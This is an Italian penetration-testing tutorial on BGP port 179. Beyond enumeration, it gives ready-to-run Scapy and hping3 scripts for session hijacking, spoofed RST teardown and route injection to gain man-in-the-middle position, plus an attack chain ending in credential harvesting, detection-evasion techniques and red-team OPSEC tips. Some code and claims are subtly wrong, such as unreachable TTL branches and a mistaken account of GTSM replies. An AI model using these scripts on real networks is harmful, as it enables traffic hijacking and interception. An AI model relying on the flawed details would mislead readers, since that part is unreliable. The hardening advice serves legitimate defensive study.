---
title: 'Porta 179 BGP: cos’è, come funziona e rischi di sicurezza del routing'
slug: porta-179-bgp
description: 'Scopri a cosa serve la porta 179 BGP, come funziona il peering tra Autonomous System, quali rischi introduce una sessione mal configurata e come si analizzano enumerazione, route injection e hijacking in un pentest autorizzato/CTF.'
image: /porta-179-bgp.webp
draft: true
date: 2026-04-03T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - bgp
  - route-hijacking
---

Porta 179 BGP espone il Border Gateway Protocol, il sistema di routing che decide come il traffico si muove tra Autonomous System (AS) su Internet e nelle grandi reti enterprise. Quando trovi la porta 179 aperta durante un pentest, stai guardando il piano di controllo della rete. Un errore di configurazione qui non significa solo accesso a un device: significa poter redirigere traffico, isolare segmenti, iniettare rotte false. L'enumerazione porta 179 rivela peering attivi, AS number, prefissi annunciati e policy di filtraggio. Nella kill chain si posiziona tra initial access e lateral movement: controllare BGP equivale a controllare il percorso dei pacchetti.

Questo articolo ti guida dall'identificazione di un peering BGP fino all'iniezione di rotte, con comandi pronti e scenari realistici per ambienti enterprise e service provider.

## 1. Anatomia Tecnica della Porta 179

La porta 179 è registrata IANA come `bgp` su protocollo TCP. BGP è un protocollo di routing path-vector che opera tra router di confine (border router) di diversi AS.

Il flusso di sessione BGP segue quattro fasi:

1. **TCP handshake** sulla porta 179 (il peer che inizia la connessione si collega alla 179 del neighbor)
2. **OPEN message**: scambio di AS number, hold time, router ID, capabilities
3. **UPDATE message**: annuncio e ritiro di prefissi con attributi (AS\_PATH, NEXT\_HOP, MED, LOCAL\_PREF)
4. **KEEPALIVE**: ogni 60 secondi di default per mantenere la sessione attiva

Le varianti operative sono eBGP (tra AS diversi, TTL=1 di default), iBGP (stesso AS, TTL=255, full mesh o route reflector) e BGP confederations (sotto-AS interni).

```
Misconfig: Peering BGP senza autenticazione MD5
Impatto: qualsiasi host che raggiunge la porta 179 del router può tentare di stabilire una sessione BGP
Come si verifica: nmap -sV -p 179 [target] e poi tentativo di connessione TCP con nc -nv [target] 179
```

```
Misconfig: Nessun prefix filter sulle sessioni eBGP
Impatto: un peer malevolo può annunciare qualsiasi prefisso, inclusi quelli altrui (BGP hijack)
Come si verifica: dalla sessione BGP, annuncia un prefisso /24 di test e verifica se viene accettato
```

```
Misconfig: TTL security non attivo su eBGP
Impatto: attacchi da host remoti (non directly connected) possono raggiungere la sessione BGP
Come si verifica: hping3 -S -p 179 -t 2 [target] (se risponde con TTL>1, GTSM non è attivo)
```

## 2. Enumerazione Base della Porta 179

L'enumerazione della porta 179 BGP parte dalla verifica dello stato TCP e dall'analisi della risposta al tentativo di connessione. Un peering BGP risponde in modo caratteristico.

### Comando 1: Nmap

```bash
nmap -sV -sC -p 179 -Pn 10.10.10.1
```

**Output atteso:**

```
PORT    STATE SERVICE VERSION
179/tcp open  bgp     BGP (Autonomous System: 65001)
| bgp-info:
|   AS Number: 65001
|   Router ID: 10.10.10.1
|_  Hold Time: 180
```

**Parametri:**

* `-sV`: identifica il servizio BGP e tenta di estrarre AS number e capabilities
* `-sC`: esegue gli script NSE di default per BGP (banner, info)
* `-Pn`: salta il ping discovery, fondamentale perché i router BGP spesso filtrano ICMP

### Comando 2: Netcat per analisi manuale

```bash
nc -nv 10.10.10.1 179
```

**Output atteso:**

```
(UNKNOWN) [10.10.10.1] 179 (bgp) open
ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ..........
```

**Cosa ci dice questo output:** la connessione TCP riesce e il router invia un BGP OPEN message (i bytes `0xFF` ripetuti sono il marker BGP). Questo conferma che il router accetta connessioni TCP sulla 179 da sorgenti non configurate come neighbor, il che indica assenza di ACL o prefix-list in ingresso sulla porta.

## 3. Enumerazione Avanzata

### Script NSE mirati per BGP

```bash
nmap -p 179 --script bgp-info 10.10.10.1
```

**Output:**

```
PORT    STATE SERVICE
179/tcp open  bgp
| bgp-info:
|   version: 4
|   AS: 65001
|   Hold Time: 180
|   Router ID: 10.10.10.1
|   Capabilities:
|     Multiprotocol: IPv4 Unicast
|     Route Refresh
|     4-byte AS Numbers
|_    Graceful Restart
```

**Lettura dell'output:** BGP version 4 è standard. AS 65001 è nella range privata (64512-65534), tipico di reti enterprise che usano iBGP o eBGP privato. Le capabilities rivelano che il router supporta route refresh (puoi forzare un re-annuncio) e graceful restart (la sessione sopravvive a brevi interruzioni). Questi dati li usi per costruire un OPEN message compatibile.

### Fingerprint del router via BGP OPEN

Usando **Scapy** puoi inviare un OPEN message crafted e analizzare la risposta per identificare vendor e versione. Per approfondire le tecniche di fingerprinting, consulta la [guida completa all'enumerazione](https://hackita.it/articoli/enumeration).

```bash
python3 -c "
from scapy.all import *
from scapy.contrib.bgp import *
pkt = IP(dst='10.10.10.1')/TCP(dport=179,sport=RandShort(),flags='S')
ans = sr1(pkt, timeout=3, verbose=0)
if ans and ans[TCP].flags == 'SA':
    print(f'[+] BGP port open, TTL={ans.ttl}, Window={ans[TCP].window}')
    if ans.ttl <= 1:
        print('[!] GTSM active (TTL=1)')
    elif ans.ttl >= 63:
        print('[*] Likely Linux-based router')
    elif ans.ttl >= 254:
        print('[*] Likely Cisco IOS/IOS-XE')
"
```

**Output:**

```
[+] BGP port open, TTL=255, Window=16384
[*] Likely Cisco IOS/IOS-XE
```

**Lettura dell'output:** TTL=255 e window size 16384 sono caratteristici di Cisco IOS. Il TTL alto indica anche che GTSM (Generalized TTL Security Mechanism) non è configurato — un router con GTSM attivo risponderebbe con TTL=1 e scarterebbe pacchetti con TTL basso.

### Enumerazione AS e prefissi via looking glass pubblici

Prima di interagire direttamente con il target, puoi raccogliere intelligence passiva sull'AS.

```bash
whois -h whois.radb.net AS65001
```

**Output:**

```
aut-num:    AS65001
as-name:    CORP-NETWORK
descr:      Corporate Internal BGP
import:     from AS65002 accept ANY
export:     from AS65001 announce AS65001
admin-c:    ADMIN-RIPE
```

**Lettura dell'output:** l'AS accetta ANY dal peer 65002 — nessun prefix filter in import. Questo è un segnale critico: se comprometti il router peer, puoi annunciare qualsiasi prefisso e verrà accettato.

### Banner timing analysis

```bash
hping3 -S -p 179 -c 3 10.10.10.1
```

**Output:**

```
HPING 10.10.10.1 (eth0 10.10.10.1): S set, 40 headers + 0 data bytes
len=44 ip=10.10.10.1 ttl=255 DF id=0 sport=179 flags=SA seq=0 win=16384 rtt=1.2 ms
len=44 ip=10.10.10.1 ttl=255 DF id=0 sport=179 flags=SA seq=1 win=16384 rtt=1.1 ms
len=44 ip=10.10.10.1 ttl=255 DF id=0 sport=179 flags=SA seq=2 win=16384 rtt=1.3 ms
```

**Lettura dell'output:** RTT stabile \~1.2ms indica connessione diretta (stessa LAN o un hop). `DF` set e `id=0` confermano Cisco IOS. Puoi usare il [tool ping per analisi avanzata](https://hackita.it/articoli/ping) del comportamento del target.

## 4. Tecniche Offensive sulla Porta 179 BGP

**BGP Session Hijack (no MD5 auth)**

Contesto: router BGP senza autenticazione MD5 sulla sessione. L'attacker è sulla stessa LAN del router o ha compromesso un host adiacente.

```bash
python3 -c "
from scapy.all import *
from scapy.contrib.bgp import *
# Step 1: TCP handshake
ip = IP(src='10.10.10.200', dst='10.10.10.1')
syn = ip/TCP(sport=12345, dport=179, flags='S')
sa = sr1(syn, timeout=3, verbose=0)
ack = ip/TCP(sport=12345, dport=179, flags='A', seq=sa.ack, ack=sa.seq+1)
send(ack, verbose=0)
# Step 2: BGP OPEN
bgp_open = ip/TCP(sport=12345,dport=179,flags='PA',seq=sa.ack,ack=sa.seq+1)/BGPHeader()/BGPOpen(my_as=65002,hold_time=180,bgp_id='10.10.10.200')
send(bgp_open, verbose=0)
print('[+] BGP OPEN sent to target')
"
```

**Output (successo):**

```
[+] BGP OPEN sent to target
```

**Output (fallimento):**

```
WARNING: Mac address to reach destination not found. Using broadcast.
```

**Cosa fai dopo:** se il router risponde con un OPEN message, hai stabilito una sessione BGP. Il passo successivo è inviare UPDATE con i prefissi che vuoi iniettare. In un pentest reale, questo richiede coordinamento stretto con il cliente per evitare impatti sulla produzione.

**BGP RST Attack (session teardown)**

Contesto: vuoi interrompere una sessione BGP esistente tra due router. Serve conoscere IP sorgente/destinazione e porta sorgente della sessione attiva.

```bash
hping3 -a 10.10.10.2 -R -p 179 -s 45321 -c 10 10.10.10.1
```

**Output (successo):**

```
HPING 10.10.10.1 (eth0 10.10.10.1): R set, 40 headers + 0 data bytes
--- 10.10.10.1 hping statistic ---
10 packets transmitted, 0 packets received, 100% packet loss
```

**Output (fallimento):**

```
HPING 10.10.10.1 (eth0 10.10.10.1): R set, 40 headers + 0 data bytes
--- 10.10.10.1 hping statistic ---
10 packets transmitted, 10 packets received, 0% packet loss
```

**Cosa fai dopo:** se la sessione BGP viene abbattuta (verificabile con un looking glass o accesso al router), i prefissi annunciati via quella sessione scompaiono dalla tabella di routing. Questo causa un blackhole temporaneo del traffico verso quei prefissi — utile come diversione. Approfondisci i concetti di [lateral movement nella rete](https://hackita.it/articoli/pivoting).

**Route Injection via sessione stabilita**

Contesto: hai stabilito una sessione BGP con un router che non filtra i prefissi in import.

```bash
python3 -c "
from scapy.all import *
from scapy.contrib.bgp import *
# Assuming TCP session already established
# BGP UPDATE: announce 192.168.100.0/24 via our AS
update = BGPHeader()/BGPUpdate(
    withdrawn_routes=[],
    path_attr=[
        BGPPathAttr(flags=0x40, type_code=1, attribute=BGPPAOrigin(origin=0)),
        BGPPathAttr(flags=0x40, type_code=2, attribute=BGPPAASPath(segments=[BGPPAASPath.ASPathSegment(segment_type=2, segment_value=[65002])])),
        BGPPathAttr(flags=0x40, type_code=3, attribute=BGPPANextHop(next_hop='10.10.10.200'))
    ],
    nlri=[BGPNLRI_IPv4(prefix='192.168.100.0/24')]
)
print('[+] BGP UPDATE crafted for 192.168.100.0/24')
"
```

**Output (successo):**

```
[+] BGP UPDATE crafted for 192.168.100.0/24
```

**Output (fallimento):**

```
BGPHeader: malformed packet - check AS_PATH attribute
```

**Cosa fai dopo:** se il router accetta l'UPDATE, il prefisso 192.168.100.0/24 viene inserito nella tabella di routing con next-hop il tuo IP. Tutto il traffico verso quella subnet ora transita da te — sei in posizione MitM. In ambito [kill chain](https://hackita.it/articoli/killchain), questo abilita intercettazione e manipolazione del traffico.

## 5. Scenari Pratici di Pentest

### Scenario 1: Enterprise con iBGP e route reflector

**Situazione:** rete enterprise con 3 siti collegati via MPLS. BGP usato internamente per lo scambio di prefissi tra siti. Route reflector centralizzato. Hai compromesso un server nella server farm del sito principale.

**Step 1:**

```bash
nmap -sV -p 179 -Pn 10.10.10.0/24
```

**Output atteso:**

```
10.10.10.1 - 179/tcp open bgp
10.10.10.2 - 179/tcp open bgp
10.10.10.3 - 179/tcp filtered bgp
```

**Step 2:**

```bash
nc -nv 10.10.10.1 179 -w 3
```

**Output atteso:**

```
(UNKNOWN) [10.10.10.1] 179 (bgp) open
ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ....
```

**Se fallisce:**

* Causa probabile: ACL sul router limita connessioni TCP/179 ai soli neighbor configurati
* Fix: verifica se il tuo IP sorgente rientra nelle subnet dei neighbor con `nmap --traceroute 10.10.10.1` per capire da quale interfaccia arrivi

**Tempo stimato:** 15-30 minuti per scan e analisi

### Scenario 2: Service Provider con eBGP esposto

**Situazione:** ISP con peering point. Router border esposto su segmento di peering condiviso. Hai accesso fisico o VPN al peering LAN.

**Step 1:**

```bash
nmap -sV -p 179 --script bgp-info 172.16.0.0/24 -Pn
```

**Output atteso:**

```
172.16.0.1 - 179/tcp open bgp (AS: 12345)
172.16.0.5 - 179/tcp open bgp (AS: 67890)
172.16.0.10 - 179/tcp filtered bgp
```

**Step 2:**

```bash
hping3 -S -p 179 -t 1 172.16.0.1
```

**Output atteso:**

```
len=44 ip=172.16.0.1 ttl=255 sport=179 flags=SA
```

**Se fallisce:**

* Causa probabile: GTSM attivo, il router scarta pacchetti con TTL troppo basso
* Fix: se sei directly connected, il tuo TTL sarà 64 o 255 — `hping3 -S -p 179 -t 255 172.16.0.1`

**Tempo stimato:** 10-20 minuti

### Scenario 3: Cloud-exposed BGP in ambiente segmentato

**Situazione:** infrastruttura cloud ibrida. BGP usato tra router on-premise e virtual network gateway cloud. Segmento di management separato ma raggiungibile via jump host compromesso.

**Step 1:**

```bash
ssh -D 9050 user@jumphost
proxychains nmap -sT -p 179 -Pn 10.0.0.1
```

**Output atteso:**

```
PORT    STATE SERVICE
179/tcp open  bgp
```

**Step 2:**

```bash
proxychains nc -nv 10.0.0.1 179 -w 5
```

**Output atteso:**

```
(UNKNOWN) [10.0.0.1] 179 (bgp) open
```

**Se fallisce:**

* Causa probabile: proxychains non supporta nativamente UDP (ma BGP è TCP, quindi ok). Il problema potrebbe essere timeout troppo stretto
* Fix: aumenta timeout in `proxychains.conf`: `tcp_read_time_out 30000`

**Tempo stimato:** 20-40 minuti (overhead proxy)

## 6. Attack Chain Completa

```
Recon (scan porta 179) → BGP OPEN fingerprint → Session Establishment → Route Injection → Traffic Redirect (MitM) → Credential Harvest → Lateral Movement
```

| Fase               | Tool            | Comando chiave                                   | Output/Risultato                       |
| ------------------ | --------------- | ------------------------------------------------ | -------------------------------------- |
| Recon              | nmap            | `nmap -sV -p 179 -Pn [subnet]`                   | Router con BGP attivo, AS number       |
| Fingerprint        | scapy           | `sr1(IP(dst=[target])/TCP(dport=179,flags='S'))` | Vendor, GTSM status, window size       |
| Session            | scapy           | `BGPOpen(my_as=65002,hold_time=180)`             | Sessione BGP stabilita                 |
| Route Inject       | scapy           | `BGPUpdate(nlri=[target_prefix/24])`             | Prefisso iniettato nella routing table |
| MitM               | ettercap/tshark | `tshark -i eth0 -f "net [prefix]"`               | Traffico intercettato                  |
| Credential Harvest | tcpdump         | `tcpdump -A -i eth0 port 80 or port 21`          | Credenziali in chiaro                  |

**Timeline stimata:** 60-180 minuti dall'identificazione della porta alla intercettazione traffico. Il bottleneck è stabilire la sessione BGP senza causare instabilità.

**Ruolo della porta 179:** è il punto di ingresso al piano di controllo della rete. Chi controlla BGP controlla dove fluisce il traffico. A differenza di altri attacchi che richiedono accesso a un singolo host, manipolare BGP impatta l'intera rete.

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* **Syslog del router**: messaggi `%BGP-3-NOTIFICATION` e `%BGP-5-ADJCHANGE` su Cisco (path: console/vty + syslog server)
* **SIEM/NOC**: alert su nuove sessioni BGP non previste, cambi di stato neighbor
* **RPKI validation**: i grandi ISP validano le origini dei prefissi con RPKI — prefissi non firmati generano alert
* **BGP monitoring tools**: RIPE RIS, BGPStream, BGPalerter rilevano annunci anomali in tempo reale

### Tecniche di Evasion

```
Tecnica: Annuncio di prefissi più specifici
Come: invece di annunciare un /16, annuncia due /17. I prefissi più specifici hanno priorità nella routing table
Riduzione rumore: l'annuncio appare come un normale split di prefisso, meno sospetto di un prefix hijack completo
```

```
Tecnica: AS_PATH prepending dell'AS legittimo
Come: includi l'AS originale nel path per rendere l'annuncio coerente con il routing esistente
Riduzione rumore: i sistemi di monitoraggio che controllano solo l'origin AS non rilevano l'anomalia
```

```
Tecnica: Timing dell'attacco durante maintenance window
Come: esegui l'iniezione durante una finestra di manutenzione annunciata (se ne hai conoscenza)
Riduzione rumore: i cambi BGP durante maintenance sono attesi e meno scrutinati
```

### Cleanup Post-Exploitation

* Ritira i prefissi iniettati con un BGP UPDATE withdraw prima di chiudere la sessione
* Chiudi la sessione BGP con un NOTIFICATION message pulito (cease code 6)
* Verifica che la routing table del target sia tornata allo stato pre-attacco tramite looking glass

## 8. Toolchain e Confronto

### Pipeline operativa

```
nmap (scan 179) → scapy (fingerprint + session) → bgp-inject (route manipulation) → tshark (traffic capture) → responder/ettercap (credential harvest)
```

Dati che passano tra fasi: IP dei router BGP, AS number, router ID, hold time, prefissi annunciati, TTL behavior, stato MD5 auth.

### Tabella comparativa

| Aspetto             | BGP (179/TCP)                               | OSPF (89/IP)              | RIP (520/UDP)                |
| ------------------- | ------------------------------------------- | ------------------------- | ---------------------------- |
| Porta default       | 179                                         | Protocol 89 (no porta)    | 520                          |
| Scope               | Inter-AS / iBGP enterprise                  | Intra-AS                  | Intra-AS (piccole reti)      |
| Autenticazione      | MD5 (opzionale), GTSM                       | MD5, area auth            | Plaintext, MD5               |
| Complessità exploit | Alta (sessione TCP stateful)                | Media (multicast)         | Bassa (UDP broadcast)        |
| Impatto             | Redirect traffico inter-AS                  | Modifica routing intra-AS | Modifica routing locale      |
| Quando preferirlo   | Target è un border router o route reflector | Target è router interno   | Target è rete legacy piccola |

## 9. Troubleshooting

| Errore / Sintomo                                     | Causa                                                                | Fix                                                                                                                             |
| ---------------------------------------------------- | -------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| `Connection refused` su porta 179                    | BGP non attivo o ACL che blocca la sorgente                          | Verifica da un IP nella subnet dei neighbor configurati                                                                         |
| BGP OPEN inviato ma nessun OPEN ricevuto in risposta | AS number nel tuo OPEN non corrisponde a nessun neighbor configurato | Prova con l'AS number scoperto nella fase di enum: `BGPOpen(my_as=[target_AS])`                                                 |
| `NOTIFICATION: Bad Peer AS`                          | L'AS nel tuo OPEN non matcha la configurazione del neighbor          | Usa `whois AS[numero]` per verificare l'AS corretto da annunciare                                                               |
| Sessione si chiude dopo OPEN                         | Hold time incompatibile o MD5 auth attiva                            | Se MD5 è attivo, senza la password non puoi procedere. Verifica con `tcpdump -i eth0 tcp port 179 -vvv` e cerca il flag TCP-MD5 |
| Hping3 non riceve SYN-ACK                            | GTSM attivo, il tuo pacchetto viene scartato per TTL insufficiente   | Usa `hping3 -S -p 179 -t 255 [target]` per simulare connessione diretta                                                         |

## 10. FAQ

**D: Come verificare se BGP sulla porta 179 ha autenticazione MD5 attiva?**

R: Tenta una connessione TCP standard con `nc -nv [target] 179`. Se la connessione TCP si stabilisce ma il router chiude immediatamente dopo il tuo OPEN, MD5 potrebbe essere attivo. Conferma con `tcpdump -i eth0 tcp port 179 -vvv` cercando il TCP option kind 19 (MD5 signature).

**D: Porta 179 BGP è pericolosa se esposta su Internet?**

R: Sì. Un router con porta 179 esposta senza ACL e senza MD5 auth è vulnerabile a session hijack e route injection. I grandi ISP filtrano la 179 con ACL e usano RPKI per validare gli annunci, ma router edge e CPE enterprise spesso mancano di queste protezioni.

**D: Che differenza c'è tra iBGP e eBGP nel contesto di un pentest?**

R: iBGP opera dentro lo stesso AS con TTL=255, eBGP tra AS diversi con TTL=1 di default. In pentest, iBGP è più accessibile da un host compromesso nella rete interna. eBGP richiede essere directly connected al router (a meno che non sia configurato `ebgp-multihop`).

**D: Come scoprire i prefissi annunciati da un AS senza accesso al router?**

R: Usa looking glass pubblici come `lg.he.net` o query WHOIS su `whois.radb.net`. Il comando `whois -h whois.radb.net -i origin AS[numero]` restituisce tutti i prefissi registrati per quell'AS.

**D: Quali tool servono per un pentest su BGP porta 179?**

R: Il kit base include: `nmap` (discovery), `hping3` (fingerprint TTL/GTSM), `scapy` con modulo `scapy.contrib.bgp` (session manipulation), `tcpdump`/`tshark` (analisi traffico). Per monitoring continuo: `bgpalerter` (open source, rileva annunci anomali).

**D: BGP hijacking è rilevabile in tempo reale?**

R: Sì, tramite RPKI validation, RIPE RIS, BGPStream e tool come bgpalerter. La detection dipende dalla velocità del monitoring: annunci anomali vengono tipicamente rilevati in 1-15 minuti dai grandi operatori, ma reti enterprise interne spesso non hanno monitoring BGP dedicato.

## 11. Cheat Sheet Finale

| Azione               | Comando                                                   | Note                                     |
| -------------------- | --------------------------------------------------------- | ---------------------------------------- |
| Scan porta BGP       | `nmap -sV -p 179 -Pn [target]`                            | `-Pn` obbligatorio, router filtrano ICMP |
| Banner grab manuale  | `nc -nv [target] 179`                                     | Attendi OPEN message (marker 0xFF)       |
| Test GTSM            | `hping3 -S -p 179 -t 1 [target]`                          | Se risponde, GTSM non è attivo           |
| Fingerprint vendor   | `hping3 -S -p 179 -c 1 [target]`                          | TTL e window size rivelano OS            |
| Enum AS/prefissi     | `whois -h whois.radb.net -i origin AS[N]`                 | Intelligence passiva, zero rumore        |
| BGP OPEN via scapy   | `BGPOpen(my_as=65002,hold_time=180)`                      | Richiede sessione TCP stabilita          |
| Cattura sessione BGP | `tcpdump -i eth0 tcp port 179 -vvv -w bgp.pcap`           | Analisi offline con Wireshark            |
| Verifica MD5 auth    | `tcpdump -i eth0 tcp port 179 -vvv \| grep "option-md5"`  | TCP option kind 19                       |
| RST attack           | `hping3 -a [spoofed_ip] -R -p 179 -s [src_port] [target]` | Serve conoscere la porta sorgente        |
| Looking glass query  | `curl "https://lg.he.net/api/v1/[AS]"`                    | Verifica prefissi annunciati             |

### Perché Porta 179 è rilevante nel 2026

BGP resta l'unico protocollo di routing inter-dominio su Internet. La migrazione a BGPsec (firma crittografica degli UPDATE) è ancora in fase iniziale. RPKI copre circa il 40-50% dei prefissi globali (verifica su `rpki-monitor.antd.nist.gov`). In ambito enterprise, iBGP è sempre più usato per reti multi-sito e SD-WAN overlay. Ogni router con porta 179 accessibile e senza MD5 è un potenziale punto di compromissione dell'intera infrastruttura di routing.

### Hardening e Mitigazione

* Attiva MD5 authentication su ogni sessione: `neighbor [IP] password [key]` (Cisco IOS)
* Configura GTSM: `neighbor [IP] ttl-security hops 1` (Cisco) o `ttl-security` (Junos)
* Implementa prefix filter rigorosi: `neighbor [IP] prefix-list STRICT in` con solo i prefissi attesi
* Abilita RPKI validation: `rpki server [URL]` + `route-map RPKI-VALID permit` con match rpki valid

### OPSEC per il Red Team

Un tentativo di connessione TCP sulla porta 179 genera immediatamente un log `%BGP-3-NOTIFICATION: received from [tuo_IP]` su router Cisco. È un protocollo ad alta visibilità. Per ridurre il rumore: limita i tentativi a un singolo SYN per verificare lo stato della porta, usa l'intelligence passiva (looking glass, WHOIS, BGPStream) prima di toccare il target, e se devi stabilire una sessione, fallo da un IP nella subnet dei neighbor legittimi per confonderti con il traffico BGP esistente.

***

Tutti i comandi e le tecniche descritti in questo articolo sono destinati esclusivamente ad ambienti autorizzati: penetration test con contratto firmato, laboratori personali, piattaforme CTF. Riferimento tecnico: RFC 4271 (BGP-4), RFC 5082 (GTSM), RFC 6810 (RPKI-to-Router Protocol).

> Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
